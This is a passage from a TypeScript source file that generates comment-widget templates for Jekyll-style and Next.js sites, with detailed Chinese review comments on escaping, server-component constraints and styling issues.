  <p>No comments yet.</p>
  {% endif %}

  <form method="POST" action="{{ site.ziscus.endpoint }}/submit" class="ziscus-form">
    <input type="hidden" name="slug" value="{{ page.slug }}">
    <div><label for="ziscus-author">Name</label>
    <input type="text" name="author" id="ziscus-author" required></div>
    <div><label for="ziscus-body">Comment</label>
    <textarea name="body" id="ziscus-body" rows="4" required></textarea></div>
    <button type="submit">Post Comment</button>
  </form>
</div>
`;
}

/**
 * 生成 Next.js（App Router / Server Component）的 `components/Ziscus.tsx`。
 *
 * 【和 Astro 一样，它走的是正确的通路】
 *   构建期 `await fetchComments(...)` → 数据是纯文本 →
 *   `{c.body}` 由 JSX 转义一次 → ✓ 正确，无双重转义问题。
 *
 * ⚠ 【它必须保持是 Server Component（`async function` + `await`）】
 *   `fetchComments()` 里用了 `AbortSignal.timeout()`，而且会发网络请求。
 *   一旦有人在文件顶部加 `"use client"`，Next.js 会在浏览器里
 *   尝试执行这些代码 —— 轻则报错，重则把 Worker 地址暴露给前端。
 *   ★ 但同时也注意：**这个组件没有 `"use server"` 也不应该有** ——
 *     它只是一个在服务端渲染期被 await 的异步组件，不是 Server Action。
 *
 * ⚠ 【CSS 通过 `dangerouslySetInnerHTML` 注入，且转义只处理了反引号】
 *   `css.replace(/`/g, "\\`")` 只预防了"反引号提前结束模板字符串"。
 *   ⚠ 没有处理 `${` —— 如果 CSS 里出现 `${`，生成的 .tsx 里就是一个
 *     插值表达式，会【语法错误或执行意外代码】。
 *   当前的主题 CSS 字面量里没有 `${`，所以是安全的；
 *   ★ 但如果用户通过 `customColors` 传进含 `${` 的颜色值
 *     （见 styles/themes.ts 里"颜色值不做校验"的 ⚠），
 *     生成的组件文件就会坏掉。**这是一个从 CLI 到生成代码的注入链**，
 *     虽然当前 CLI 传不进 customColors（见 InitOptions 的 ⚠），
 *     但两处一旦各自被"修好"，组合起来就是问题。
 *   ★ 正确做法：把 CSS 转义成 JSON 字符串（`JSON.stringify(css)`）
 *     再嵌进模板，而不是手工 replace 反引号。
 *
 * ⚠ 【`<style>` 写在组件里会被渲染进 `<body>`】
 *   Next.js 只会把 `<head>` 里的 `<style>` 提到文档头；组件内的
 *   `<style>` 会留在 body 中，每个用到该组件的位置都重复一份。
 *   ★ 建议改成 `import "./ziscus.css"`（App Router 支持组件级 CSS 导入）。
 *
 * ⚠ 【用 `c.id` 作 key ✓ 正确】mock/导入的数据里 id 由随机字节生成，
 *   重复导入时可能重复（见 cli/migrate.ts 的 ⚠），
 *   届时 React 会警告 duplicate key —— 那是个有用的信号，别静音它。
 *
 * ⚠ 【同样没有 `id="comments"` / `.comment-form`】
 *   最外层是 `className="ziscus"`，表单是 `className="ziscus-form"`。
 *   Worker 的即时预览 / 按页暂停都不生效，见文件头「问题 1」。
 *
 * @param css 由 generateThemeCss() 生成的样式文本（⚠ 属于 `.ziscus` 体系）
 */
function nextjsComponent(css: string): string {
  return `import { fetchComments } from "ziscus";

interface Props {
  slug: string;
  endpoint: string;
}

export async function Ziscus({ slug, endpoint }: Props) {
  const comments = await fetchComments(slug, endpoint);
  const approved = comments.filter(c => c.status === "approved");

  return (
    <div className="ziscus">
      <style dangerouslySetInnerHTML={{ __html: \`${css.replace(/`/g, "\\`")}\` }} />

      {approved.length > 0 ? (
        <>
          <h2>{approved.length} {approved.length === 1 ? "Comment" : "Comments"}</h2>
          {approved.map(c => (
            <article key={c.id} className="ziscus-comment">
              <header className="ziscus-header">
                <strong className="ziscus-author">{c.author}</strong>
                <time className="ziscus-time" dateTime={c.createdAt}>
                  {new Date(c.createdAt).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric", timeZone: "UTC" })}
                </time>
              </header>
              <p className="ziscus-body">{c.body}</p>
            </article>
          ))}
        </>
      ) : (
        <>
          <h2>Comments</h2>
          <p>No comments yet.</p>
        </>
      )}

      <form method="POST" action={\`\${endpoint}/submit\`} className="ziscus-form">
        <input type="hidden" name="slug" value={slug} />
        <div><label htmlFor="ziscus-author">Name</label>
        <input type="text" name="author" id="ziscus-author" required /></div>
        <div><label htmlFor="ziscus-body">Comment</label>
        <textarea name="body" id="ziscus-body" rows={4} required /></div>
        <button type="submit">Post Comment</button>
      </form>
    </div>
  );
}
`;
}
